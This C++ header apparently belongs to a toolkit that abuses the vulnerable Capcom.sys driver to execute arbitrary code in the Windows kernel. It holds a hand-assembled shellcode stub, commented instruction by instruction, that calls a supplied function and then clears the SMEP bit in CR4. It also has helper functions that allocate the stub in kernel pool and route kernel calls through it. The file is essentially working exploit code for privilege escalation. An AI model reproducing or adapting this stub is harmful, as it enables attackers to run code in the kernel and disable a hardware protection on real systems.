#pragma once
#include "KernelRoutines.h"
#include "LockedMemory.h"
#include "CapcomLoader.h"

// Not thread safe!
using fnPassiveCall = uint64_t( *)( ... );

NON_PAGED_DATA static fnFreeCall Khk_ExAllocatePool = 0;
NON_PAGED_DATA static fnPassiveCall Khk_PassiveCallStub = 0;

static const uint32_t Kh_PassiveCallStubCallStoreOffset = 0x2F;
NON_PAGED_DATA static UCHAR Kh_PassiveCallStubData[] =
{
	0xFB,											// sti
	0x8F, 0x05, 0x20, 0x00, 0x00, 0x00,				// pop [ret_store]
	0x48, 0x8D, 0x05, 0x07, 0x00, 0x00, 0x00,		// lea rax, [continue]
	0x50,											// push rax
	0xFF, 0x25, 0x1A, 0x00, 0x00, 0x00,				// jmp [call_store] (stub+0x2F)
	0xFA,											// cli
	0x0F, 0x20, 0xE1,								// mov rcx, cr4
	0x48, 0x0F, 0xBA, 0xF1, 0x14,					// btr rcx, 0x14
	0x0F, 0x22, 0xE1,								// mov cr4, rcx
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,				// jmp [ret_store]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// ret_store:  dq 0
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// call_store: dq 0
};


// This function is the only _TRICKY_ part of this project.
// ExAllocatePool does not require interrupts to be enabled WHEN the size is small and we are depending on that.
NON_PAGED_CODE static void Khk_AllocatePassiveStub()
{
	PVOID Out = ( PVOID ) Khk_ExAllocatePool( 0ull, sizeof( Kh_PassiveCallStubData ) );
	Np_memcpy( Out, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
	Khk_PassiveCallStub = ( fnPassiveCall ) Out;
}

template<typename ...Params>
NON_PAGED_CODE static uint64_t Khk_CallPassive( PVOID Ptr, Params &&... params )
{
	*( PVOID* ) ( ( ( PUCHAR ) Khk_PassiveCallStub ) + Kh_PassiveCallStubCallStoreOffset ) = Ptr;
	return Khk_PassiveCallStub( std::forward<Params>( params ) ... );
}

static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
{
	Khk_ExAllocatePool = KrCtx->GetProcAddress<fnFreeCall>( "ExAllocatePool" );
	CpCtx->ExecuteInKernel( Khk_AllocatePassiveStub );
}